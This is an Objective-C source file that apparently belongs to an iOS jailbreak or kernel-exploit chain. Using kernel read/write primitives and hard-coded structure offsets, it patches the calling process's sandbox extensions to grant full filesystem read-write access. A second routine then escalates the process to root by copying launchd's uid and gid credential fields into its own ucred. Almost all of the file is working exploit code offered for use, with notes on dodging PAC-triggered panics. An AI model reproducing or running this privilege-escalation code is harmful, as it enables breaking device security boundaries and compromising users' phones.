/*
 * sandbox_escape.m — Sandbox escape via kernel memory patching
 *
 * Walk proc_ro → ucred → cr_label → sandbox → ext_set → ext_table
 * Patch extension paths to "/", rewrite class to "com.apple.app-sandbox.read-write"
 * Fill all 16 hash slots → full R+W filesystem access
 * Based on 18.3_sandbox/root.m by CrazyMind90.
 */

#import <Foundation/Foundation.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/stat.h>
#include "sandbox_escape.h"
#import "kexploit_opa334.h"
#import "krw.h"
#import "kutils.h"
#import "offsets.h"

extern void early_kread(uint64_t where, void *read_buf, size_t size);

#define KRW_LEN 0x20

// Verified offsets (IDA binary analysis across 6 kernelcaches)
#define OFF_PROC_PROC_RO       0x18  // proc → proc_ro (stable 17.0-26.x)
#define OFF_PROC_RO_UCRED      0x20  // proc_ro → p_ucred (verified all versions)
#define OFF_UCRED_CR_LABEL     0x78  // ucred → cr_label (KDK struct dump)
#define OFF_LABEL_SANDBOX      0x10  // label → sandbox (MAC l_perpolicy[1])
#define OFF_SANDBOX_EXT_SET    0x10  // sandbox → ext_set
#define OFF_EXT_DATA           0x40  // ext → data_addr
#define OFF_EXT_DATALEN        0x48  // ext → data_len

// posix_cred lives inside ucred at +0x18 (16B cr_link + 8B cr_ref).
// Derived from OFF_UCRED_CR_LABEL=0x78 and sizeof(posix_cred)=0x60.
#define OFF_UCRED_CR_POSIX     0x18
#define OFF_POSIX_CR_UID       0x00
#define OFF_POSIX_CR_RUID      0x04
#define OFF_POSIX_CR_SVUID     0x08
#define OFF_POSIX_CR_NGROUPS   0x0C
#define OFF_POSIX_CR_GROUPS_0  0x10  // first group (cr_groups[0])
#define OFF_POSIX_CR_RGID      0x50
#define OFF_POSIX_CR_SVGID     0x54
#define OFF_POSIX_CR_GMUID     0x58
#define OFF_POSIX_CR_FLAGS     0x5C

#ifdef __arm64e__
static uint64_t __attribute((naked)) __xpaci_sbx(uint64_t a) {
    asm(".long 0xDAC143E0");
    asm("ret");
}
#else
#define __xpaci_sbx(x) (x)
#endif

extern uint64_t VM_MIN_KERNEL_ADDRESS;
extern uint64_t pac_mask;

#define S(x) ({ uint64_t _v = __xpaci_sbx(x); \
    ((_v >> 32) > 0xFFFF ? (_v | pac_mask) : _v); })
#define K(x) ((x) > VM_MIN_KERNEL_ADDRESS)

#pragma mark - Extension patching

static void patch_ext(uint64_t ext) {
    uint64_t da = early_kread64(ext + OFF_EXT_DATA);
    uint64_t dl = early_kread64(ext + OFF_EXT_DATALEN);
    if (K(da) && dl > 0) {
        uint8_t buf[KRW_LEN];
        early_kread(da, buf, KRW_LEN);
        buf[0] = '/'; buf[1] = 0;
        early_kwrite32bytes(da, buf);
    }
    uint8_t chunk[KRW_LEN];
    early_kread(ext + OFF_EXT_DATA, chunk, KRW_LEN);
    *(uint64_t*)(chunk + 0x08) = 1;
    *(uint64_t*)(chunk + 0x10) = 0xFFFFFFFFFFFFFFFFULL;
    early_kwrite32bytes(ext + OFF_EXT_DATA, chunk);
}

static int patch_chain(uint64_t hdr) {
    int n = 0;
    for (int i = 0; i < 64 && K(hdr); i++) {
        uint64_t ext = S(early_kread64(hdr + 0x8));
        if (K(ext)) { patch_ext(ext); n++; }
        uint64_t next = early_kread64(hdr);
        if (!next || !K(next)) break;
        hdr = S(next);
    }
    return n;
}

static void set_rw_class(uint64_t hdr) {
    uint64_t ext = S(early_kread64(hdr + 0x8));
    if (!K(ext)) return;
    uint64_t da = early_kread64(ext + OFF_EXT_DATA);
    if (!K(da)) return;

    const char *rw = "com.apple.app-sandbox.read-write";
    uint8_t b1[KRW_LEN], b2[KRW_LEN];
    memset(b1, 0, KRW_LEN); memset(b2, 0, KRW_LEN);
    memcpy(b1, rw, KRW_LEN);
    early_kwrite32bytes(da + 32, b1);
    early_kwrite32bytes(da + 64, b2);

    uint8_t hb[KRW_LEN];
    early_kread(hdr, hb, KRW_LEN);
    *(uint64_t*)(hb + 0x10) = da + 32;
    early_kwrite32bytes(hdr, hb);
}

#pragma mark - Main entry

int sandbox_escape(uint64_t self_proc) {
    if (!self_proc) { NSLog(@"[SBX] self_proc is NULL"); return -1; }

    uint64_t proc_ro_raw = early_kread64(self_proc + OFF_PROC_PROC_RO);
    uint64_t proc_ro = S(proc_ro_raw);
    NSLog(@"[SBX] self_proc=0x%llx proc_ro_raw=0x%llx proc_ro=0x%llx", self_proc, proc_ro_raw, proc_ro);
    if (!K(proc_ro)) { NSLog(@"[SBX] proc_ro invalid"); return -1; }

    // Scan proc_ro for ucred — offset varies by iOS build.
    // p_ucred is an SMR pointer. Dump offsets 0x10-0x40 to find it.
    NSLog(@"[SBX] Scanning proc_ro for ucred...");
    uint64_t ucred = 0;
    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
        uint64_t raw = early_kread64(proc_ro + off);
        uint64_t smr = kread_smrptr(proc_ro + off);
        uint64_t pac = S(raw);
        NSLog(@"[SBX]   proc_ro+0x%x: raw=0x%llx smr=0x%llx pac=0x%llx", off, raw, smr, pac);

        // Check if smr-decoded value looks like ucred (cr_label at +0x78 is a kernel ptr)
        if (K(smr)) {
            uint64_t maybe_label = S(early_kread64(smr + 0x78));
            if (K(maybe_label)) {
                uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
                if (K(maybe_sandbox)) {
                    NSLog(@"[SBX] Found ucred at proc_ro+0x%x (SMR) = 0x%llx", off, smr);
                    ucred = smr;
                    break;
                }
            }
        }
        // Also try PAC-stripped
        if (!ucred && K(pac)) {
            uint64_t maybe_label = S(early_kread64(pac + 0x78));
            if (K(maybe_label)) {
                uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
                if (K(maybe_sandbox)) {
                    NSLog(@"[SBX] Found ucred at proc_ro+0x%x (PAC) = 0x%llx", off, pac);
                    ucred = pac;
                    break;
                }
            }
        }
    }
    if (!K(ucred)) { NSLog(@"[SBX] ucred not found in proc_ro"); return -1; }

    uint64_t label = S(early_kread64(ucred + OFF_UCRED_CR_LABEL));
    if (!K(label)) { NSLog(@"[SBX] cr_label invalid"); return -1; }

    uint64_t sandbox = S(early_kread64(label + OFF_LABEL_SANDBOX));
    if (!K(sandbox)) { NSLog(@"[SBX] sandbox invalid"); return -1; }

    uint64_t ext_set = S(early_kread64(sandbox + OFF_SANDBOX_EXT_SET));
    if (!K(ext_set)) { NSLog(@"[SBX] ext_set invalid"); return -1; }

    NSLog(@"[SBX] proc_ro=0x%llx ucred=0x%llx label=0x%llx sandbox=0x%llx ext_set=0x%llx",
          proc_ro, ucred, label, sandbox, ext_set);

    int patched = 0;
    for (int s = 0; s < 16; s++) {
        uint64_t hdr = S(early_kread64(ext_set + s * 8));
        if (K(hdr)) patched += patch_chain(hdr);
    }
    NSLog(@"[SBX] Patched %d extensions", patched);

    int classed = 0;
    for (int s = 0; s < 16; s++) {
        uint64_t hdr = S(early_kread64(ext_set + s * 8));
        if (K(hdr) && K(early_kread64(hdr + 0x10))) { set_rw_class(hdr); classed++; }
    }
    NSLog(@"[SBX] Changed %d extension classes", classed);

    uint64_t src = 0;
    for (int s = 0; s < 16 && !src; s++) {
        uint64_t h = S(early_kread64(ext_set + s * 8));
        if (K(h)) src = h;
    }
    if (src) {
        int filled = 0;
        for (int s = 0; s < 16; s++) {
            uint64_t h = early_kread64(ext_set + s * 8);
            if (!h || !K(h)) { early_kwrite64(ext_set + s * 8, src); filled++; }
        }
        NSLog(@"[SBX] Filled %d empty hash slots", filled);
    }

    int fd_w = open("/var/mobile/.sbx_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd_w >= 0) { close(fd_w); unlink("/var/mobile/.sbx_test"); }

    if (fd_w >= 0) {
        NSLog(@"[SBX] *** SANDBOX ESCAPED (R+W) ***");
        return 0;
    }

    NSLog(@"[SBX] Sandbox escape verification failed (errno=%d: %s)", errno, strerror(errno));
    return -1;
}

#pragma mark - UID elevation (uid=0 via launchd ucred swap)

// Scan proc_ro in [0x10..0x40] for a valid ucred pointer.
// A valid ucred has cr_label at +0x78 pointing to a kernel addr
static int sbx_find_ucred_slot(uint64_t proc, uint64_t *ucred_out, uint32_t *off_out) {
    if (!proc) return -1;
    uint64_t proc_ro = S(early_kread64(proc + OFF_PROC_PROC_RO));
    if (!K(proc_ro)) return -1;

    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
        uint64_t raw = early_kread64(proc_ro + off);
        uint64_t smr = kread_smrptr(proc_ro + off);
        uint64_t pac = S(raw);
        uint64_t cands[2] = { smr, pac };
        for (int i = 0; i < 2; i++) {
            uint64_t c = cands[i];
            if (!K(c)) continue;
            uint64_t lbl = S(early_kread64(c + OFF_UCRED_CR_LABEL));
            if (!K(lbl)) continue;
            uint64_t sbx = S(early_kread64(lbl + OFF_LABEL_SANDBOX));
            if (K(sbx)) {
                *ucred_out = c;
                *off_out = off;
                return 0;
            }
        }
    }
    return -1;
}

static uint64_t sbx_ucredbyproc(uint64_t proc) {
    uint64_t ucred = 0;
    uint32_t off = 0;
    if (sbx_find_ucred_slot(proc, &ucred, &off) != 0) return 0;
    return ucred;
}

// Like sbx_ucredbyproc but works for processes without a sandbox (e.g. launchd).
// sbx_find_ucred_slot requires a sandbox pointer to confirm ucred — launchd has none.
// Instead: scan proc_ro offsets 0x10-0x40 for any kernel pointer whose value
// at +0x78 is also a kernel pointer (that's the cr_label field of ucred).
static uint64_t sbx_ucredbyproc_nosandbox(uint64_t proc) {
    if (!proc) return 0;
    uint64_t proc_ro = S(early_kread64(proc + OFF_PROC_PROC_RO));
    if (!K(proc_ro)) return 0;

    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
        uint64_t raw = early_kread64(proc_ro + off);
        uint64_t smr = kread_smrptr(proc_ro + off);
        uint64_t cands[2] = { smr, S(raw) };
        for (int i = 0; i < 2; i++) {
            uint64_t c = cands[i];
            if (!K(c)) continue;
            // ucred has cr_label at +0x78 — must be a kernel pointer
            uint64_t maybe_label = S(early_kread64(c + OFF_UCRED_CR_LABEL));
            if (K(maybe_label)) return c;
        }
    }
    return 0;
}

// UI log callback — set from ADSRootViewController before calling elevate
void (^sbx_ui_log)(NSString *) = NULL;
#define ELOG(fmt, ...) do {     NSString *_s = [NSString stringWithFormat:@"[elv] " fmt, ##__VA_ARGS__];     NSLog(@"%@", _s);     if (sbx_ui_log) { void(^_cb)(NSString*) = sbx_ui_log; dispatch_async(dispatch_get_main_queue(), ^{ _cb(_s); }); } } while(0)

int sandbox_elevate_to_root(uint64_t self_proc) {
    // Strategy: copy uid/gid fields from launchd's posix_cred into our own ucred.
    //
    // DO NOT swap the ucred pointer in proc/proc_ro — those pointers are PAC-signed
    // with the DA key. Writing a stripped/unauth'd pointer triggers a PAC failure
    // → kernel panic (confirmed by panic log: "PAC failure from kernel with DA key
    // while authing x16"). Instead, patch the posix_cred fields inside our own ucred
    // (which we already hold a valid reference to).

    if (!self_proc) {
        ELOG(@"self_proc is NULL");
        return -1;
    }

    // Find our ucred via dynamic scan (handles proc_ro+0x20 vs +0x28 across iOS versions)
    uint64_t our_ucred = 0;
    uint32_t ucred_slot_off = 0;
    if (sbx_find_ucred_slot(self_proc, &our_ucred, &ucred_slot_off) != 0) {
        // Fallback: use offsets_init values directly
        uint64_t our_proc_ro = S(early_kread64(self_proc + OFF_PROC_PROC_RO));
        if (K(our_proc_ro)) {
            our_ucred = S(early_kread64(our_proc_ro + OFF_PROC_RO_UCRED));
        }
    }
    ELOG(@"our ucred: 0x%llx", our_ucred);
    if (!K(our_ucred)) {
        ELOG(@"failed to find our ucred");
        return -1;
    }

    // Find launchd (pid 1) — proc_find(1) is safe (stops at first hit)
    uint64_t launchd = proc_find(1);
    ELOG(@"launchd proc: 0x%llx", launchd);
    if (!launchd || launchd == (uint64_t)-1) {
        ELOG(@"could not find launchd");
        return -1;
    }

    // Get launchd's ucred (no sandbox, so use nosandbox variant)
    uint64_t launchd_ucred = sbx_ucredbyproc_nosandbox(launchd);
    ELOG(@"launchd ucred: 0x%llx", launchd_ucred);
    if (!K(launchd_ucred)) {
        ELOG(@"failed to get launchd ucred");
        return -1;
    }

    // posix_cred is embedded in ucred at OFF_UCRED_CR_POSIX (+0x18).
    // Read launchd's posix_cred fields and write them into ours.
    // This avoids touching any PAC-protected pointers.
    uint64_t ld_posix  = launchd_ucred + OFF_UCRED_CR_POSIX;
    uint64_t our_posix = our_ucred     + OFF_UCRED_CR_POSIX;

    // uid, ruid, svuid (each uint32_t at +0x00, +0x04, +0x08)
    uint32_t ld_uid   = kread32(ld_posix + OFF_POSIX_CR_UID);
    uint32_t ld_ruid  = kread32(ld_posix + OFF_POSIX_CR_RUID);
    uint32_t ld_svuid = kread32(ld_posix + OFF_POSIX_CR_SVUID);
    ELOG(@"launchd uid=%u ruid=%u svuid=%u", ld_uid, ld_ruid, ld_svuid);

    kwrite32(our_posix + OFF_POSIX_CR_UID,   ld_uid);
    kwrite32(our_posix + OFF_POSIX_CR_RUID,  ld_ruid);
    kwrite32(our_posix + OFF_POSIX_CR_SVUID, ld_svuid);

    // rgid, svgid (at +0x50, +0x54)
    uint32_t ld_rgid  = kread32(ld_posix + OFF_POSIX_CR_RGID);
    uint32_t ld_svgid = kread32(ld_posix + OFF_POSIX_CR_SVGID);
    kwrite32(our_posix + OFF_POSIX_CR_RGID,  ld_rgid);
    kwrite32(our_posix + OFF_POSIX_CR_SVGID, ld_svgid);

    // Also copy groups[0] so gid=0
    uint32_t ld_gid0 = kread32(ld_posix + OFF_POSIX_CR_GROUPS_0);
    kwrite32(our_posix + OFF_POSIX_CR_GROUPS_0, ld_gid0);

    // Memory + TLB barrier before calling getuid()
    __asm__ volatile("dsb sy; isb" ::: "memory");

    int uid = getuid();
    ELOG(@"uid after posix_cred patch: %d", uid);
    if (uid == 0) {
        ELOG(@"SUCCESS - root achieved via posix_cred patch");
        return 0;
    }

    ELOG(@"failed uid=%d", uid);
    return -1;
}
